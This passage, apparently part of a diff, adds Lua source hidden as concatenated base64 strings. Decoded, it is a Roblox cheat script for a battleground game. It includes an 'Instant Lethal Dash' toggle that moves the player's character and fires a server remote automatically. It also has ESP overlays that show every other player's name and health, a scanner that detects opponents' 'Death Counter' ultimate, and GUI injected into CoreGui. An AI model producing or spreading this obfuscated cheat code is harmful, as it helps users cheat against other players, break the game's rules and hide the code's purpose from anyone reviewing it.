+.."YWxzZQogICAgZW5kKQplbmQpCgotLSDilIDilIAgNC4gSW5zdGFudCBMZXRoYWwgRGFzaCDilIDilIDilIDilIDilIDilIDilIDi
+.."lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDi
+.."lIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIDilIAKbG9jYWwgbGV0aGFsRW5hYmxl
+.."ZCA9IGZhbHNlCmF1dG9UZWNoVGFiOkNyZWF0ZVRvZ2dsZSh7CiAgICBOYW1lICAgICAgICAgPSAiSW5zdGFudCBMZXRoYWwgRGFz
+.."aCIsCiAgICBDdXJyZW50VmFsdWUgPSBmYWxzZSwKICAgIEZsYWcgICAgICAgICA9ICJBdXRvTGV0aGFsRGFzaCIsCiAgICBDYWxs
+.."YmFjayAgICAgPSBmdW5jdGlvbih2KSBsZXRoYWxFbmFibGVkID0gdiBlbmQsCn0pCgpob29rQW5pbWF0aW9uKCIxMjI5NjExMzk4
+.."NiIsIGZ1bmN0aW9uKHRyYWNrLCBjaGFyKQogICAgaWYgbm90IGxldGhhbEVuYWJsZWQgdGhlbiByZXR1cm4gZW5kCiAgICBsb2Nh
+.."bCBjb21tID0gY2hhcjpGaW5kRmlyc3RDaGlsZCgiQ29tbXVuaWNhdGUiKQogICAgbG9jYWwgcm9vdCA9IGNoYXI6RmluZEZpcnN0
+.."Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgaWYgbm90IGNvbW0gb3Igbm90IHJvb3QgdGhlbiByZXR1cm4gZW5kCiAgICB0
+.."YXNrLndhaXQoMS41OSkKICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICByb290LkNGcmFtZSA9IHJvb3QuQ0ZyYW1lICsgVmVj
+.."dG9yMy5uZXcoMCwgNSwgMCkKICAgICAgICBjb21tOkZpcmVTZXJ2ZXIoeyBEYXNoID0gRW51bS5LZXlDb2RlLlcsIEtleSA9IEVu
+.."dW0uS2V5Q29kZS5RLCBHb2FsID0gIktleVByZXNzIiB9KQogICAgICAgIHJvb3QuQW5jaG9yZWQgPSB0cnVlCiAgICAgICAgdGFz
+.."ay53YWl0KDEpCiAgICAgICAgcm9vdC5BbmNob3JlZCA9IGZhbHNlCiAgICBlbmQpCmVuZCkKCi0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KLS0g4pWQ4pWQ4pWQIFRB
+.."QjogRVNQIOKVkOKVkOKVkAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
+.."LS0tLS0tLS0tLS0tLS0tLS0tLS0tCmxvY2FsIGVzcFRhYiA9IFdpbmRvdzpDcmVhdGVUYWIoIvCfkYEgRVNQIiwgImV5ZSIpCgot
+.."LSDilIDilIAgRGVhdGggQ291bnRlciBkZXRlY3Rpb24g4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
+.."4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
+.."4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACi0tIFNhaXRhbWEncyAiRGVhdGggQ291bnRlciIgdWx0aW1hdGUgaW4g
+.."VFNCIGFkZHMgaWRlbnRpZmlhYmxlIG9iamVjdHMgdG8gdGhlCi0tIGNoYXJhY3RlciAoQm9vbFZhbHVlcyAvIFN0cmluZ1ZhbHVl
+.."cyAvIFBhcnRpY2xlRW1pdHRlcnMpLiAgV2Ugc2NhbiBmb3IgdGhlbS4KbG9jYWwgRENfS0VZV09SRFMgPSB7ICJkZWF0aCIsICJj
+.."b3VudGVyIiwgInVsdGltYXRlIiwgInJhZ2UiLCAiZGMiLCAic2FpdGFtYSIgfQoKbG9jYWwgZnVuY3Rpb24gc3RySGFzS2V5d29y
+.."ZChzKQogICAgcyA9IHM6bG93ZXIoKQogICAgZm9yIF8sIGt3IGluIGlwYWlycyhEQ19LRVlXT1JEUykgZG8KICAgICAgICBpZiBz
+.."OmZpbmQoa3csIDEsIHRydWUpIHRoZW4gcmV0dXJuIHRydWUgZW5kCiAgICBlbmQKICAgIHJldHVybiBmYWxzZQplbmQKCmxvY2Fs
+.."IGZ1bmN0aW9uIGlzSW5EZWF0aENvdW50ZXIoY2hhcikKICAgIGlmIG5vdCBjaGFyIHRoZW4gcmV0dXJuIGZhbHNlIGVuZAogICAg
+.."Zm9yIF8sIG9iaiBpbiBpcGFpcnMoY2hhcjpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgIGlmIHN0ckhhc0tleXdvcmQob2Jq
+.."Lk5hbWUpIHRoZW4KICAgICAgICAgICAgaWYgb2JqOklzQSgiQm9vbFZhbHVlIikgICBhbmQgb2JqLlZhbHVlICAgICAgICAgIHRo
+.."ZW4gcmV0dXJuIHRydWUgZW5kCiAgICAgICAgICAgIGlmIG9iajpJc0EoIlN0cmluZ1ZhbHVlIikgYW5kIG9iai5WYWx1ZSB+PSAi
+.."IiAgICB0aGVuIHJldHVybiB0cnVlIGVuZAogICAgICAgICAgICBpZiBvYmo6SXNBKCJOdW1iZXJWYWx1ZSIpIGFuZCBvYmouVmFs
+.."dWUgPiAwICAgICAgdGhlbiByZXR1cm4gdHJ1ZSBlbmQKICAgICAgICAgICAgaWYgb2JqOklzQSgiUGFydGljbGVFbWl0dGVyIikg
+.."b3Igb2JqOklzQSgiQmVhbSIpIHRoZW4gcmV0dXJuIHRydWUgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIHJldHVybiBmYWxz
+.."ZQplbmQKCi0tIOKUgOKUgCBFU1Agc3RhdGUg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
+.."4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
+.."4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACmxvY2Fs
+.."IGVzcEVuYWJsZWQgPSBmYWxzZQpsb2NhbCBlc3BPYmplY3RzID0ge30gICAtLSBwbGF5ZXIg4oaSIHsgYmlsbGJvYXJkLCBsYWJl
+.."bCwgaGVhbHRoQmFyLCBoZWFsdGhGaWxsIH0KCmxvY2FsIEVTUF9OT1JNQUxfQ09MT1IgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1
+.."NSwgMjU1KQpsb2NhbCBFU1BfRENfQ09MT1IgICAgID0gQ29sb3IzLmZyb21SR0IoMjU1LCA1MCwgNTApCgpsb2NhbCBmdW5jdGlv
+.."biBidWlsZEVTUChwbGF5ZXIpCiAgICBpZiBwbGF5ZXIgPT0gTG9jYWxQbGF5ZXIgdGhlbiByZXR1cm4gZW5kCiAgICBpZiBlc3BP
+.."YmplY3RzW3BsYXllcl0gdGhlbiByZXR1cm4gZW5kCgogICAgbG9jYWwgZnVuY3Rpb24gYXR0YWNoKGNoYXIpCiAgICAgICAgaWYg
+.."bm90IGNoYXIgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgbG9jYWwgaHJwID0gY2hhcjpXYWl0Rm9yQ2hpbGQoIkh1bWFub2lkUm9v
+.."dFBhcnQiLCAzKQogICAgICAgIGlmIG5vdCBocnAgdGhlbiByZXR1cm4gZW5kCgogICAgICAgIC0tIFJlbW92ZSBzdGFsZSBiaWxs
+.."Ym9hcmQgaWYgY2hhcmFjdGVyIHJlc3Bhd25lZAogICAgICAgIGlmIGVzcE9iamVjdHNbcGxheWVyXSB0aGVuCiAgICAgICAgICAg
+.."IHBjYWxsKGZ1bmN0aW9uKCkgZXNwT2JqZWN0c1twbGF5ZXJdLmJpbGxib2FyZDpEZXN0cm95KCkgZW5kKQogICAgICAgICAgICBl
+.."c3BPYmplY3RzW3BsYXllcl0gPSBuaWwKICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgYmIgPSBJbnN0YW5jZS5uZXcoIkJpbGxi
+.."b2FyZEd1aSIpCiAgICAgICAgYmIuTmFtZSAgICAgICAgID0gIkJhc2ljSHViRVNQIgogICAgICAgIGJiLlNpemUgICAgICAgICA9
+.."IFVEaW0yLm5ldygwLCAxMzAsIDAsIDUwKQogICAgICAgIGJiLlN0dWRzT2Zmc2V0ICA9IFZlY3RvcjMubmV3KDAsIDQsIDApCiAg
+.."ICAgICAgYmIuQWx3YXlzT25Ub3AgID0gdHJ1ZQogICAgICAgIGJiLk1heERpc3RhbmNlICA9IDEyMDAKICAgICAgICBiYi5QYXJl
+.."bnQgICAgICAgPSBocnAKCiAgICAgICAgLS0gTmFtZSBsYWJlbAogICAgICAgIGxvY2FsIG5hbWVMYWJlbCA9IEluc3RhbmNlLm5l
+.."dygiVGV4dExhYmVsIiwgYmIpCiAgICAgICAgbmFtZUxhYmVsLlNpemUgICAgICAgICAgICAgICAgICA9IFVEaW0yLm5ldygxLCAw
+.."LCAwLjU1LCAwKQogICAgICAgIG5hbWVMYWJlbC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgICAgIG5hbWVMYWJlbC5U
+.."ZXh0Q29sb3IzICAgICAgICAgICAgPSBFU1BfTk9STUFMX0NPTE9SCiAgICAgICAgbmFtZUxhYmVsLlRleHRTdHJva2VUcmFuc3Bh
+.."cmVuY3kgPSAwLjUKICAgICAgICBuYW1lTGFiZWwuVGV4dFN0cm9rZUNvbG9yMyAgICAgID0gQ29sb3IzLmZyb21SR0IoMCwgMCwg
+.."MCkKICAgICAgICBuYW1lTGFiZWwuRm9udCAgICAgICAgICAgICAgICAgID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgICAgICBu
+.."YW1lTGFiZWwuVGV4dFNpemUgICAgICAgICAgICAgID0gMTMKICAgICAgICBuYW1lTGFiZWwuVGV4dCAgICAgICAgICAgICAgICAg
+.."ID0gcGxheWVyLk5hbWUKICAgICAgICBuYW1lTGFiZWwuVGV4dFhBbGlnbm1lbnQgICAgICAgID0gRW51bS5UZXh0WEFsaWdubWVu
+.."dC5DZW50ZXIKCiAgICAgICAgLS0gSGVhbHRoIGJhciBiYWNrZ3JvdW5kCiAgICAgICAgbG9jYWwgaEJHID0gSW5zdGFuY2UubmV3
+.."KCJGcmFtZSIsIGJiKQogICAgICAgIGhCRy5TaXplICAgICAgICAgICAgICAgPSBVRGltMi5uZXcoMC44LCAwLCAwLCA2KQogICAg
+.."ICAgIGhCRy5Qb3NpdGlvbiAgICAgICAgICAgPSBVRGltMi5uZXcoMC4xLCAwLCAwLjcsIDApCiAgICAgICAgaEJHLkJhY2tncm91
+.."bmRDb2xvcjMgICA9IENvbG9yMy5mcm9tUkdCKDQwLCA0MCwgNDApCiAgICAgICAgaEJHLkJvcmRlclNpemVQaXhlbCAgICA9IDAK
+.."ICAgICAgICBsb2NhbCBoQkdDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIiwgaEJHKQogICAgICAgIGhCR0Nvcm5lci5D
+.."b3JuZXJSYWRpdXMgPSBVRGltLm5ldygxLCAwKQoKICAgICAgICAtLSBIZWFsdGggYmFyIGZpbGwKICAgICAgICBsb2NhbCBoRmls
+.."bCA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBoQkcpCiAgICAgICAgaEZpbGwuU2l6ZSAgICAgICAgICAgICA9IFVEaW0yLm5ldygx
+.."LCAwLCAxLCAwKQogICAgICAgIGhGaWxsLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig4MCwgMjIwLCA4MCkKICAg
+.."ICAgICBoRmlsbC5Cb3JkZXJTaXplUGl4ZWwgID0gMAogICAgICAgIGxvY2FsIGhGaWxsQ29ybmVyID0gSW5zdGFuY2UubmV3KCJV
+.."SUNvcm5lciIsIGhGaWxsKQogICAgICAgIGhGaWxsQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDEsIDApCgogICAgICAg
+.."IGVzcE9iamVjdHNbcGxheWVyXSA9IHsKICAgICAgICAgICAgYmlsbGJvYXJkICAgPSBiYiwKICAgICAgICAgICAgbGFiZWwgICAg
+.."ICAgPSBuYW1lTGFiZWwsCiAgICAgICAgICAgIGhlYWx0aEJHICAgID0gaEJHLAogICAgICAgICAgICBoZWFsdGhGaWxsICA9IGhG
+.."aWxsLAogICAgICAgIH0KICAgIGVuZAoKICAgIGlmIHBsYXllci5DaGFyYWN0ZXIgdGhlbiBhdHRhY2gocGxheWVyLkNoYXJhY3Rl
+.."cikgZW5kCiAgICBwbGF5ZXIuQ2hhcmFjdGVyQWRkZWQ6Q29ubmVjdChhdHRhY2gpCmVuZAoKbG9jYWwgZnVuY3Rpb24gcmVtb3Zl
+.."RVNQKHBsYXllcikKICAgIGlmIGVzcE9iamVjdHNbcGxheWVyXSB0aGVuCiAgICAgICAgcGNhbGwoZnVuY3Rpb24oKSBlc3BPYmpl
+.."Y3RzW3BsYXllcl0uYmlsbGJvYXJkOkRlc3Ryb3koKSBlbmQpCiAgICAgICAgZXNwT2JqZWN0c1twbGF5ZXJdID0gbmlsCiAgICBl
+.."bmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBlbmFibGVFU1AoKQogICAgZm9yIF8sIHBsciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5
+.."ZXJzKCkpIGRvCiAgICAgICAgYnVpbGRFU1AocGxyKQogICAgZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gZGlzYWJsZUVTUCgpCiAg
+.."ICBmb3IgcGxyIGluIHBhaXJzKGVzcE9iamVjdHMpIGRvCiAgICAgICAgcmVtb3ZlRVNQKHBscikKICAgIGVuZAplbmQKCi0tIFVw
+.."ZGF0ZSBsYWJlbHMgKyBoZWFsdGggYmFycyBldmVyeSBmcmFtZQpSdW5TZXJ2aWNlLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9u
+.."KCkKICAgIGlmIG5vdCBlc3BFbmFibGVkIHRoZW4gcmV0dXJuIGVuZAogICAgZm9yIHBsYXllciwgZGF0YSBpbiBwYWlycyhlc3BP
+.."YmplY3RzKSBkbwogICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYgbm90IGRhdGEuYmlsbGJvYXJkLlBhcmVu
+.."dCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgbG9jYWwgY2hhciA9IHBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgbG9j
+.."YWwgaHVtICA9IGNoYXIgYW5kIGNoYXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCgogICAgICAgICAgICAtLSBE
+.."ZWF0aCBDb3VudGVyIGxhYmVsCiAgICAgICAgICAgIGlmIGlzSW5EZWF0aENvdW50ZXIoY2hhcikgdGhlbgogICAgICAgICAgICAg
+.."ICAgZGF0YS5sYWJlbC5UZXh0ICAgICAgID0gIuKYoCAiIC4uIHBsYXllci5OYW1lIC4uICJcbltERUFUSCBDT1VOVEVSXSIKICAg
+.."ICAgICAgICAgICAgIGRhdGEubGFiZWwuVGV4dENvbG9yMyA9IEVTUF9EQ19DT0xPUgogICAgICAgICAgICBlbHNlCiAgICAgICAg
+.."ICAgICAgICBkYXRhLmxhYmVsLlRleHQgICAgICAgPSBwbGF5ZXIuTmFtZQogICAgICAgICAgICAgICAgZGF0YS5sYWJlbC5UZXh0
+.."Q29sb3IzID0gRVNQX05PUk1BTF9DT0xPUgogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIC0tIEhlYWx0aCBiYXIKICAgICAg
+.."ICAgICAgaWYgaHVtIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIHBjdCA9IG1hdGguY2xhbXAoaHVtLkhlYWx0aCAvIG1hdGgu
+.."bWF4KGh1bS5NYXhIZWFsdGgsIDEpLCAwLCAxKQogICAgICAgICAgICAgICAgZGF0YS5oZWFsdGhGaWxsLlNpemUgPSBVRGltMi5u
+.."ZXcocGN0LCAwLCAxLCAwKQogICAgICAgICAgICAgICAgaWYgcGN0ID4gMC41IHRoZW4KICAgICAgICAgICAgICAgICAgICBkYXRh
+.."LmhlYWx0aEZpbGwuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDgwLCAyMjAsIDgwKQogICAgICAgICAgICAgICAg
+.."ZWxzZWlmIHBjdCA+IDAuMjUgdGhlbgogICAgICAgICAgICAgICAgICAgIGRhdGEuaGVhbHRoRmlsbC5CYWNrZ3JvdW5kQ29sb3Iz
+.."ID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyMDAsIDApCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgZGF0
+.."YS5oZWFsdGhGaWxsLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDYwLCA2MCkKICAgICAgICAgICAgICAg
+.."IGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kKQoKLS0gUGxheWVyIGpvaW4vbGVhdmUKUGxheWVy
+.."cy5QbGF5ZXJBZGRlZDpDb25uZWN0KGZ1bmN0aW9uKHBscikKICAgIGlmIGVzcEVuYWJsZWQgdGhlbiBidWlsZEVTUChwbHIpIGVu
+.."ZAplbmQpClBsYXllcnMuUGxheWVyUmVtb3Zpbmc6Q29ubmVjdChmdW5jdGlvbihwbHIpCiAgICByZW1vdmVFU1AocGxyKQplbmQp
+.."CgotLSDilIDilIAgRVNQIFVJIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
+.."gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
+.."gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgAplc3BU
+.."YWI6Q3JlYXRlU2VjdGlvbigiUGxheWVycyIpCgplc3BUYWI6Q3JlYXRlVG9nZ2xlKHsKICAgIE5hbWUgICAgICAgICA9ICJQbGF5
+.."ZXIgRVNQICAobmFtZXMgKyBoZWFsdGgpIiwKICAgIEN1cnJlbnRWYWx1ZSA9IGZhbHNlLAogICAgRmxhZyAgICAgICAgID0gIlBs
+.."YXllckVTUCIsCiAgICBDYWxsYmFjayAgICAgPSBmdW5jdGlvbih2KQogICAgICAgIGVzcEVuYWJsZWQgPSB2CiAgICAgICAgaWYg
+.."diB0aGVuIGVuYWJsZUVTUCgpIGVsc2UgZGlzYWJsZUVTUCgpIGVuZAogICAgZW5kLAp9KQoKZXNwVGFiOkNyZWF0ZUxhYmVsKCJE
+.."ZWF0aENvdW50ZXI6IEVTUCBhdXRvLWhpZ2hsaWdodHMgcGxheWVycyB1c2luZyBTYWl0YW1hJ3MgdWx0aW1hdGUgaW4gcmVkLiIp
+.."Cgplc3BUYWI6Q3JlYXRlRGl2aWRlcigpCmVzcFRhYjpDcmVhdGVTZWN0aW9uKCJEZWF0aCBDb3VudGVyIEVTUCIpCmVzcFRhYjpD
+.."cmVhdGVMYWJlbCgiU2VwYXJhdGUgZmxvYXRpbmcgd2luZG93OiBzaG93cyDwn5KiIHdoZW4gcGxheWVyIGhhcyBEZWF0aCBDb3Vu
+.."dGVyIHNraWxsLCDimKAgYWZ0ZXIuIikKCi0tIOKUgOKUgCBEZWF0aCBDb3VudGVyIEVTUCBXaW5kb3cg4pSA4pSA4pSA4pSA4pSA
+.."4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
+.."4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACmxvY2FsIGRjRXNwR3VpID0g
+.."SW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKQpkY0VzcEd1aS5OYW1lICAgICAgICAgICA9ICJCSF9EQ19FU1AiCmRjRXNwR3VpLlJl
+.."c2V0T25TcGF3biAgID0gZmFsc2UKZGNFc3BHdWkuWkluZGV4QmVoYXZpb3IgPSBFbnVtLlpJbmRleEJlaGF2aW9yLlNpYmxpbmcK
+.."cGNhbGwoZnVuY3Rpb24oKSBkY0VzcEd1aS5QYXJlbnQgPSBnYW1lOkdldFNlcnZpY2UoIkNvcmVHdWkiKSBlbmQpCmlmIG5vdCBk
+.."Y0VzcEd1aS5QYXJlbnQgdGhlbiBkY0VzcEd1aS5QYXJlbnQgPSBMb2NhbFBsYXllcjpXYWl0Rm9yQ2hpbGQoIlBsYXllckd1aSIp
+.."IGVuZAoKbG9jYWwgZGNGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiLCBkY0VzcEd1aSkKZGNGcmFtZS5TaXplICAgICAgICAg
+.."ICAgID0gVURpbTIubmV3KDAsIDI1MCwgMCwgOTApCmRjRnJhbWUuUG9zaXRpb24gICAgICAgICA9IFVEaW0yLm5ldygwLjUsIC0x
+.."MjUsIDAuMSwgMCkKZGNGcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjAsIDIwLCAyNSkKZGNGcmFtZS5C
+.."b3JkZXJTaXplUGl4ZWwgID0gMApkY0ZyYW1lLkNsaXBzRGVzY2VuZGFudHMgPSB0cnVlCmRjRnJhbWUuVmlzaWJsZSAgICAgICAg
+.."ICA9IGZhbHNlCkluc3RhbmNlLm5ldygiVUlDb3JuZXIiLCBkY0ZyYW1lKQoKbG9jYWwgZGNUaXRsZSA9IEluc3RhbmNlLm5ldygi
+.."VGV4dExhYmVsIiwgZGNGcmFtZSkKZGNUaXRsZS5TaXplICAgICAgICAgICAgICAgICAgID0gVURpbTIubmV3KDEsIDAsIDAsIDI4
+.."KQpkY1RpdGxlLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCmRjVGl0bGUuVGV4dCAgICAgICAgICAgICAgICAgICA9ICJFU1Ag
+.."RGVhdGggQ291bnRlciIKZGNUaXRsZS5UZXh0Q29sb3IzICAgICAgICAgICAgID0gQ29sb3IzLmZyb21SR0IoMjU1LCA4MCwgODAp
+.."CmRjVGl0bGUuRm9udCAgICAgICAgICAgICAgICAgICA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCmRjVGl0bGUuVGV4dFNpemUgICAg
+.."ICAgICAgICAgICA9IDE1Cgpsb2NhbCBkY1RvZ2dsZUJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIsIGRjRnJhbWUpCmRj
+.."VG9nZ2xlQnRuLlNpemUgICAgICAgICAgICAgPSBVRGltMi5uZXcoMSwgLTIwLCAwLCAzMikKZGNUb2dnbGVCdG4uUG9zaXRpb24g
+.."ICAgICAgICA9IFVEaW0yLm5ldygwLCAxMCwgMCwgMzIpCmRjVG9nZ2xlQnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJv
+.."bVJHQig3MCwgMjAwLCAxMDApCmRjVG9nZ2xlQnRuLlRleHRDb2xvcjMgICAgICAgPSBDb2xvcjMubmV3KDEsIDEsIDEpCmRjVG9n
+.."Z2xlQnRuLkZvbnQgICAgICAgICAgICAgPSBFbnVtLkZvbnQuR290aGFtU2VtaWJvbGQKZGNUb2dnbGVCdG4uVGV4dFNpemUgICAg
+.."ICAgICA9IDEzCmRjVG9nZ2xlQnRuLlRleHQgICAgICAgICAgICAgPSAiREMgRVNQOiBPTiIKSW5zdGFuY2UubmV3KCJVSUNvcm5l
+.."ciIsIGRjVG9nZ2xlQnRuKQoKbG9jYWwgZGNDb2xCdG4gPSBJbnN0YW5jZS5uZXcoIlRleHRCdXR0b24iLCBkY0ZyYW1lKQpkY0Nv
+.."bEJ0bi5TaXplICAgICAgICAgICAgID0gVURpbTIubmV3KDAsIDIyLCAwLCAyMikKZGNDb2xCdG4uUG9zaXRpb24gICAgICAgICA9
+.."IFVEaW0yLm5ldygxLCAtMjYsIDAsIDMpCmRjQ29sQnRuLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxMDAsIDEw
+.."MCwgMTAwKQpkY0NvbEJ0bi5UZXh0Q29sb3IzICAgICAgID0gQ29sb3IzLm5ldygxLCAxLCAxKQpkY0NvbEJ0bi5Gb250ICAgICAg
+.."ICAgICAgID0gRW51bS5Gb250LkdvdGhhbUJvbGQKZGNDb2xCdG4uVGV4dFNpemUgICAgICAgICA9IDE2CmRjQ29sQnRuLlRleHQg
+.."ICAgICAgICAgICAgPSAiLSIKSW5zdGFuY2UubmV3KCJVSUNvcm5lciIsIGRjQ29sQnRuKQoKLS0gQ29sbGFwc2UgLyBleHBhbmQK
+.."bG9jYWwgZGNFeHBhbmRlZCA9IHRydWUKZGNDb2xCdG4uTW91c2VCdXR0b24xQ2xpY2s6Q29ubmVjdChmdW5jdGlvbigpCiAgICBp
+.."ZiBkY0V4cGFuZGVkIHRoZW4KICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKGRjRnJhbWUsIFR3ZWVuSW5mby5uZXcoMC4yNSks
+.."IHsgU2l6ZSA9IFVEaW0yLm5ldygwLCAyNTAsIDAsIDI4KSB9KTpQbGF5KCkKICAgICAgICBkY0NvbEJ0bi5UZXh0ID0gIisiCiAg
+.."ICAgICAgZGNFeHBhbmRlZCAgICA9IGZhbHNlCiAgICBlbHNlCiAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShkY0ZyYW1lLCBU
+.."d2VlbkluZm8ubmV3KDAuMjUpLCB7IFNpemUgPSBVRGltMi5uZXcoMCwgMjUwLCAwLCA5MCkgfSk6UGxheSgpCiAgICAgICAgZGND
+.."b2xCdG4uVGV4dCA9ICItIgogICAgICAgIGRjRXhwYW5kZWQgICAgPSB0cnVlCiAgICBlbmQKZW5kKQoKLS0gREMgRVNQIHRvZ2ds
+.."ZQpsb2NhbCBkY0VzcE9uID0gdHJ1ZQpkY1RvZ2dsZUJ0bi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAg
+.."IGRjRXNwT24gPSBub3QgZGNFc3BPbgogICAgZGNUb2dnbGVCdG4uQmFja2dyb3VuZENvbG9yMyA9IGRjRXNwT24gYW5kIENvbG9y
+.."My5mcm9tUkdCKDcwLCAyMDAsIDEwMCkgb3IgQ29sb3IzLmZyb21SR0IoMTAwLCAxMDAsIDEwMCkKICAgIGRjVG9nZ2xlQnRuLlRl
+.."eHQgICAgICAgICAgICAgPSBkY0VzcE9uIGFuZCAiREMgRVNQOiBPTiIgb3IgIkRDIEVTUDogT0ZGIgplbmQpCgotLSBEQyBFU1Ag
+.."ZHJhZyAoUmF5ZmllbGQtc3R5bGUpCmxvY2FsIGRjVG9nZ2xlLCBkY0RyYWdJbnB1dCwgZGNEcmFnU3RhcnQsIGRjRHJhZ1N0YXJ0
+.."UG9zID0gZmFsc2UsIG5pbCwgbmlsLCBuaWwKbG9jYWwgZnVuY3Rpb24gYXBwbHlEQ0RyYWcoaW5wdXQpCiAgICBsb2NhbCBkZWx0
+.."YSA9IGlucHV0LlBvc2l0aW9uIC0gZGNEcmFnU3RhcnQKICAgIFR3ZWVuU2VydmljZTpDcmVhdGUoZGNGcmFtZSwgVHdlZW5JbmZv
+.."Lm5ldygwLjAyNSksIHsKICAgICAgICBQb3NpdGlvbiA9IFVEaW0yLm5ldygKICAgICAgICAgICAgZGNEcmFnU3RhcnRQb3MuWC5T
+.."Y2FsZSwgZGNEcmFnU3RhcnRQb3MuWC5PZmZzZXQgKyBkZWx0YS5YLAogICAgICAgICAgICBkY0RyYWdTdGFydFBvcy5ZLlNjYWxl
+.."LCBkY0RyYWdTdGFydFBvcy5ZLk9mZnNldCArIGRlbHRhLlkKICAgICAgICApLAogICAgfSk6UGxheSgpCmVuZApkY0ZyYW1lLklu
+.."cHV0QmVnYW46Q29ubmVjdChmdW5jdGlvbihpbnB1dCkKICAgIGlmIChpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklu
+.."cHV0VHlwZS5Nb3VzZUJ1dHRvbjEgb3IKICAgICAgICBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5U
+.."b3VjaCkgYW5kCiAgICAgICAgVXNlcklucHV0U2VydmljZTpHZXRGb2N1c2VkVGV4dEJveCgpID09IG5pbCB0aGVuCiAgICAgICAg
+.."ZGNUb2dnbGUgICAgICAgPSB0cnVlCiAgICAgICAgZGNEcmFnU3RhcnQgICAgPSBpbnB1dC5Qb3NpdGlvbgogICAgICAgIGRjRHJh
+.."Z1N0YXJ0UG9zID0gZGNGcmFtZS5Qb3NpdGlvbgogICAgICAgIGlucHV0LkNoYW5nZWQ6Q29ubmVjdChmdW5jdGlvbigpCiAgICAg
